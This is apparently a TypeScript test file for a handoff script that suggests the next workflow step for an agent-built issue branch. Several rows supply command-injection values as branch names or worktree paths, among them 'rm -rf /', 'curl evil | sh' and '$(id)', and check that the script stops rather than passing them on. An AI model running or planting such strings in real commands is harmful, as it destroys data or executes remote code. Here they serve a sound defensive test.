import { test } from "node:test";
import assert from "node:assert/strict";
import { nextStep, type Snapshot, type StepId } from "../../scripts/handoff/next.ts";

const RUN = { n: 1, kind: "build", started: "t", pid: 1, ended: "t2", exit: 0 } as const;
const BASE: Snapshot = {
  issue: 1500,
  root: "/r",
  folder: "/r/out/1500-handoff",
  builder: "codex",
  state: {
    issue: 1500,
    plan: "/p/1500-plan.md",
    tree: "/r/.claude/worktrees/codex-1500",
    session: "s",
    model: "m",
    effort: "high",
    thread: "th",
    runs: [RUN],
  },
  running: false,
  outcome: "ready",
  branch: "feat/1500-x",
  treeHead: "a",
  remoteHead: "a",
  proverReported: false,
  pr: null,
};
const snap = (over: Partial<Snapshot>): Snapshot => ({ ...BASE, ...over });
const open = { number: 9, state: "OPEN" } as const;
const unended = snap({ running: true, state: { ...BASE.state!, runs: [{ ...RUN, ended: null }] } });

const ROWS: readonly [row: number, over: Snapshot, id: StepId, needle: string, absent?: string][] = [
  [1, snap({ state: null, builder: "claude" }), "claude-builds", "no builder:codex label"],
  [2, snap({ state: null }), "plan", "npm run handoff -- build 1500 --plan"],
  [3, unended, "running", "tail -f /r/out/1500-handoff/run-1.jsonl"],
  [4, { ...unended, builder: "claude" }, "running", "tail -f"],
  [
    5,
    snap({ outcome: "handback", treeHead: "b" }),
    "replan",
    "git -C /r/.claude/worktrees/codex-1500 -c core.hooksPath=/dev/null push -u origin feat/1500-x",
  ],
  [6, snap({ outcome: "handback" }), "replan", "npm run handoff -- resume 1500 --brief", "core.hooksPath"],
  [7, snap({ outcome: null }), "stopped", "without its outcome line"],
  [8, snap({ outcome: null, state: { ...BASE.state!, thread: null } }), "stopped", "cannot be resumed"],
  [9, snap({ branch: null }), "stopped", "on no branch"],
  [10, snap({ pr: { number: 9, state: "MERGED" }, treeHead: "b" }), "retire", "git -C /r worktree remove --force"],
  [11, snap({ pr: { number: 9, state: "CLOSED" } }), "closed", "closed without merging"],
  [12, snap({ treeHead: "b" }), "push", "npm run handoff -- next 1500 again"],
  [
    24,
    snap({ treeHead: "b" }),
    "push",
    "git -C /r/.claude/worktrees/codex-1500 -c core.hooksPath=/dev/null push -u origin feat/1500-x",
  ],
  [13, snap({ treeHead: "b", pr: open }), "push", "pull request #9 updates"],
  [14, snap({ pr: open }), "review", "npm run handoff -- resume 1500 --brief"],
  [15, BASE, "prove", "/r/out/1500-handoff/guards.md"],
  [16, snap({ proverReported: true }), "open-pr", "/r/out/1500-handoff/record.md"],
  [17, snap({ state: { ...BASE.state!, tree: "/evil; rm -rf /" } }), "stopped", "Ask Alex", "evil"],
  [18, snap({ state: { ...BASE.state!, tree: "/r/.claude/worktrees/codex-1" } }), "stopped", "Ask Alex", "codex-1 "],
  [19, snap({ branch: "x; curl evil | sh" }), "stopped", "Ask Alex", "curl"],
  [20, snap({ branch: "-f" }), "stopped", "Ask Alex", "origin -f"],
  [21, snap({ branch: "a..b" }), "stopped", "Ask Alex", "a..b"],
  [22, snap({ branch: "$(id)" }), "stopped", "Ask Alex", "$(id)"],
  [23, snap({ branch: "x\ny", pr: { number: 9, state: "MERGED" } }), "stopped", "Ask Alex", "worktree remove"],
];

test("next names one step for each state of an issue's build, in order (Issue #1409)", () => {
  for (const [row, over, id, needle, absent] of ROWS) {
    const step = nextStep(over);
    assert.equal(step.id, id, `row ${row}`);
    assert.ok(step.text.includes(needle), `row ${row}: ${step.text}`);
    if (absent !== undefined) assert.ok(!step.text.includes(absent), `row ${row}: ${step.text}`);
  }
});
